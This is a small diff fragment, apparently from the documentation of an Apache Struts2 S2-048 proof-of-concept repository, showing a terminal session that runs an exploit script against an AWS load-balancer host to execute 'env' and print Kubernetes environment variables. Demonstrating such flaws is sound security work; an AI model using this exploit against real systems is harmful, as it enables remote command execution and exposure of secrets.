@@ -25,7 +25,6 @@ struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897
 ubuntu@brett-jumpbox:~/apache-struts2-PoC$
 
 ubuntu@brett-jumpbox:~/apache-struts2-PoC$ python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'
-[Execute]: env
 
 KUBERNETES_SERVICE_PORT_HTTPS=443
 KUBERNETES_SERVICE_PORT=443
